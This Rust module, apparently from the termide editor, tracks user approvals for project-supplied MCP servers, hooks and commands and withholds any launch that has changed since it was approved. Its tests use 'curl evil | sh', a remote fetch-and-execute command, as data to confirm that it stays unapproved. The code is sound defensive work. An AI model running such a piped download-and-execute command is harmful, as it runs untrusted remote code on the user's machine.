//! The launches a user approved for a project: the MCP servers, hooks and
//! commands a project brings, which run programs (or send its keys to an
//! address) and so start only once approved.
//!
//! An approval is for one launch as it was shown: the whole of what starts
//! it ([`McpServerConfig::launch_spec`], [`HookConfig::launch_spec`]). A
//! repository that changes the command after the fact is asked about again.
//! The file lives in termide's data directory, never in the project.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};

use crate::hooks::HookConfig;
use crate::mcp::McpServerConfig;

#[derive(Debug, Default, Serialize, Deserialize)]
struct Approved {
    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
    mcp: BTreeMap<String, String>,
    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
    hooks: BTreeMap<String, String>,
    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
    commands: BTreeMap<String, String>,
}

/// The approvals of one project, kept in `path`. Without a path nothing is
/// approved and nothing can be.
#[derive(Debug, Clone, Default)]
pub struct Approvals {
    path: Option<PathBuf>,
}

impl Approvals {
    #[must_use]
    pub fn new(path: Option<PathBuf>) -> Self {
        Self { path }
    }

    fn read(&self) -> Approved {
        let Some(path) = &self.path else {
            return Approved::default();
        };
        match std::fs::read_to_string(path) {
            Ok(text) => toml::from_str(&text).unwrap_or_else(|e| {
                log::warn!("ignoring {}: {e}", path.display());
                Approved::default()
            }),
            Err(_) => Approved::default(),
        }
    }

    fn write(&self, approved: &Approved) -> Result<(), String> {
        let path = self.path.as_ref().ok_or("no place to keep approvals")?;
        write_file(path, approved)
    }

    /// Whether the server `name` may start as `config` says.
    #[must_use]
    pub fn mcp_approved(&self, name: &str, config: &McpServerConfig) -> bool {
        self.read().mcp.get(name) == Some(&config.launch_spec())
    }

    /// Whether the hook `name` may run as `config` says.
    #[must_use]
    pub fn hook_approved(&self, name: &str, config: &HookConfig) -> bool {
        self.read().hooks.get(name) == Some(&config.launch_spec())
    }

    /// Approve the server `name` as `config` starts it.
    ///
    /// # Errors
    ///
    /// When the approval cannot be kept.
    pub fn approve_mcp(&self, name: &str, config: &McpServerConfig) -> Result<(), String> {
        let mut approved = self.read();
        approved.mcp.insert(name.to_string(), config.launch_spec());
        self.write(&approved)
    }

    /// Approve the hook `name` as `config` runs it.
    ///
    /// # Errors
    ///
    /// When the approval cannot be kept.
    pub fn approve_hook(&self, name: &str, config: &HookConfig) -> Result<(), String> {
        let mut approved = self.read();
        approved
            .hooks
            .insert(name.to_string(), config.launch_spec());
        self.write(&approved)
    }

    /// Whether the project's command `name` may run as `spec` describes it
    /// (the caller's one-line account of everything it runs).
    #[must_use]
    pub fn command_approved(&self, name: &str, spec: &str) -> bool {
        self.read()
            .commands
            .get(name)
            .is_some_and(|kept| kept == spec)
    }

    /// Approve the project's command `name` as `spec` describes it.
    ///
    /// # Errors
    ///
    /// When the approval cannot be kept.
    pub fn approve_command(&self, name: &str, spec: &str) -> Result<(), String> {
        let mut approved = self.read();
        approved.commands.insert(name.to_string(), spec.to_string());
        self.write(&approved)
    }

    /// Hold back every server a project brings that is not approved as it
    /// is configured now.
    pub fn withhold_mcp(&self, servers: &mut BTreeMap<String, McpServerConfig>) {
        let approved = self.read();
        for (name, config) in servers.iter_mut() {
            config.withheld =
                config.from_project && approved.mcp.get(name) != Some(&config.launch_spec());
        }
    }

    /// The hooks that may run: every one of the configuration level, and a
    /// project's when approved as it is now. The ones held back are
    /// returned beside them.
    #[must_use]
    pub fn split_hooks(
        &self,
        hooks: BTreeMap<String, HookConfig>,
    ) -> (BTreeMap<String, HookConfig>, BTreeMap<String, HookConfig>) {
        let approved = self.read();
        hooks.into_iter().partition(|(name, config)| {
            !config.from_project || approved.hooks.get(name) == Some(&config.launch_spec())
        })
    }
}

fn write_file(path: &Path, approved: &Approved) -> Result<(), String> {
    if let Some(dir) = path.parent() {
        std::fs::create_dir_all(dir)
            .map_err(|e| format!("cannot create {}: {e}", dir.display()))?;
    }
    let text = toml::to_string(approved).map_err(|e| e.to_string())?;
    std::fs::write(path, text).map_err(|e| format!("cannot write {}: {e}", path.display()))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn server(command: &str) -> McpServerConfig {
        McpServerConfig {
            command: Some(command.to_string()),
            from_project: true,
            ..Default::default()
        }
    }

    #[test]
    fn a_project_server_starts_once_approved_and_until_it_changes() {
        let dir = tempfile::tempdir().unwrap();
        let approvals = Approvals::new(Some(dir.path().join("t/approved.toml")));
        let mut servers = BTreeMap::from([
            ("p".to_string(), server("npx")),
            (
                "mine".to_string(),
                McpServerConfig {
                    from_project: false,
                    ..server("npx")
                },
            ),
        ]);
        approvals.withhold_mcp(&mut servers);
        assert!(servers["p"].withheld);
        assert!(!servers["mine"].withheld, "the user's own servers start");

        approvals.approve_mcp("p", &servers["p"]).unwrap();
        approvals.withhold_mcp(&mut servers);
        assert!(!servers["p"].withheld);

        servers.get_mut("p").unwrap().args = vec!["evil".into()];
        approvals.withhold_mcp(&mut servers);
        assert!(
            servers["p"].withheld,
            "a changed launch is asked about again"
        );
    }

    #[test]
    fn a_project_hook_runs_once_approved() {
        let dir = tempfile::tempdir().unwrap();
        let approvals = Approvals::new(Some(dir.path().join("approved.toml")));
        let hook = HookConfig {
            event: crate::hooks::HookEvent::BeforeToolCall,
            command: "./check.sh".into(),
            args: Vec::new(),
            tools: Vec::new(),
            timeout_secs: 30,
            enabled: true,
            from_project: true,
        };
        let hooks = BTreeMap::from([("check".to_string(), hook.clone())]);
        let (run, held) = approvals.split_hooks(hooks.clone());
        assert!(run.is_empty() && held.len() == 1);
        approvals.approve_hook("check", &hook).unwrap();
        let (run, held) = approvals.split_hooks(hooks);
        assert!(run.len() == 1 && held.is_empty());
        // Approved for some tools, it is asked about again for every tool.
        let wider = HookConfig {
            tools: vec!["*".into()],
            ..hook
        };
        let (run, _) = approvals.split_hooks(BTreeMap::from([("check".to_string(), wider)]));
        assert!(run.is_empty());
    }

    #[test]
    fn a_project_command_is_approved_as_it_reads() {
        let dir = tempfile::tempdir().unwrap();
        let approvals = Approvals::new(Some(dir.path().join("approved.toml")));
        assert!(!approvals.command_approved("fmt", "cargo fmt"));
        approvals.approve_command("fmt", "cargo fmt").unwrap();
        assert!(approvals.command_approved("fmt", "cargo fmt"));
        assert!(!approvals.command_approved("fmt", "curl evil | sh"));
    }

    #[test]
    fn without_a_place_nothing_is_approved() {
        let approvals = Approvals::default();
        assert!(!approvals.mcp_approved("p", &server("x")));
        assert!(approvals.approve_mcp("p", &server("x")).is_err());
    }
}
